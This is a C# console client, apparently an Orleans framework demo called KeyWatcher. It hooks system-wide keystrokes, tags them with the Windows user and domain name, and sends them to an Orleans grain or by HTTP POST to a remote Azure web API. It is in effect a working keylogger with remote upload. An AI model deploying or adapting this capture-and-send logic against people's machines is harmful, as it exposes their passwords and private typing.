using KeyWatching;
using KeyWatcher.Messages;
using KeyWatcher.Orleans.Contracts;
using Orleans;
using Orleans.Runtime.Configuration;
using System;
using System.Windows.Forms;
using Newtonsoft.Json;
using System.Net.Http;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

namespace KeyWatcher.Orleans.Client
{
	class Program
	{
		private const ushort BufferSize = 20;
		private const string Termination = "STOP IT";
		private static string userName;

		private const string LocalUri = "http://localhost:6344/api/keywatcher";
		private const string AzureUri = "http://keywatcher.azurewebsites.net/api/keywatcher";

#pragma warning disable IDE0022 // Use expression body for methods
		static void Main(string[] args)
		{
			Program.UseOrleansLocally();
			//Program.UseOrleansViaWebApi(Program.AzureUri);
		}
#pragma warning restore IDE0022 // Use expression body for methods

		private static void UseOrleansLocally()
		{
			Program.userName = Program.GetUserName();

			var config = ClientConfiguration.LocalhostSilo(30000);

			while (true)
			{
				try
				{
					var client =
						 new ClientBuilder().UseConfiguration(config).Build();
					client.Connect().GetAwaiter().GetResult();
					break;
				}
				// TODO: Get Rocky to stop laughing at me.
				catch
				{
					Task.Delay(TimeSpan.FromSeconds(1));
				}
			}

			GrainClient.Initialize(config);
			Console.Out.WriteLine("Begin...");

			using (var keyLogger = new BufferedEventedNativeKeyWatcher(Program.BufferSize))
			{
				keyLogger.KeysLogged += Program.OnKeysLogged;
				Application.Run();
			}
		}

		private static void OnKeysLogged(object sender, BufferedKeysEventArgs e)
		{
			var user = GrainClient.GrainFactory.GetGrain<IUserGrain>(Program.userName);
			var keys = e.Keys.ToArray();

			user.ProcessAsync(new UserKeysMessage(Program.userName, keys));
			var message = new string(keys);

			if (message.Contains(Program.Termination))
			{
				Application.Exit();
			}
		}

		private static void UseOrleansViaWebApi(string url)
		{
			Console.Out.WriteLine("Begin...");
			var userName = Program.GetUserName();

			using (var keyLogger = new BufferedEventedNativeKeyWatcher(Program.BufferSize))
			{
				keyLogger.KeysLogged += (s, e) =>
				{
					var message = JsonConvert.SerializeObject(
						new UserKeysMessage(userName, e.Keys.ToArray()), Formatting.Indented);
					var content = new StringContent(message,
						Encoding.Unicode, "application/json");
					var postResponse = new HttpClient().PostAsync(url, content);
					postResponse.Wait();
				};

				Application.Run();
			}

			Console.ReadLine();
		}

		private static string GetUserName() =>
			$"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? $"{Environment.UserDomainName}-" : string.Empty)}{Environment.UserName}";
	}
}